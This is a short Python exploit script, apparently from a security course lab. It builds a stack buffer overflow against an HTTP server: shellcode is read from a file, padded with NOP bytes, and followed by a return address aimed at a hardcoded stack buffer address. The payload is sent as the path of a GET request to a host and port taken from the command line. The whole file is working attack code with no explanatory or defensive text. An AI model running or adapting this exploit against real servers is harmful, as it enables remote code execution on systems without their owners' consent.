#!/usr/bin/env python3

import sys
import socket
import traceback

stack_buffer  = 0x7fffffffdca0
stack_rbp     = 0x7fffffffecb0
stack_retaddr = 0x7fffffffecb8

def build_exploit(payload):
    req =   b"GET /" + payload + b" HTTP/1.0\r\n" + \
            b"\r\n"
    return req

def send_req(host, port, req):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Connecting to %s:%d..." % (host, port))
    sock.connect((host, port))

    print("Connected, sending request...")
    sock.send(req)

    print("Request sent, waiting for reply...")
    rbuf = sock.recv(1024)
    resp = b""

    while len(rbuf):
        resp = resp + rbuf
        rbuf = sock.recv(1024)

    print("Received reply.")
    sock.close()
    return resp

def create_padding(pad_len, pad_byte = b'\x90'):
    padding = b''
    for i in range(pad_len):
        padding = padding + pad_byte
    return padding

def hex2bytes(hex_num):
    hex_string = format(hex_num, 'x')
    print(hex_string)
    bytes_data = bytes.fromhex(hex_string)
    reversed_bytes = bytes_data[::-1]
    print(reversed_bytes)
    return reversed_bytes

def attack():
    if len(sys.argv) != 3:
        print("Usage: " + sys.argv[0] + " host port")
        exit()

    try:
        shellfile = open("shellcode-raw", "rb")
        shellcode = shellfile.read()

        payload = shellcode + create_padding(stack_retaddr - stack_buffer - len(shellcode) - 1)
        new_retaddr = stack_buffer + 1
        payload = payload + hex2bytes(new_retaddr)

        req = build_exploit(payload)
        print("HTTP request:")
        print(req)
        print(len(req))
        resp = send_req(sys.argv[1], int(sys.argv[2]), req)
        print("HTTP response:")
        print(resp)
    except:
        print("Exception:")
        print(traceback.format_exc())

attack()
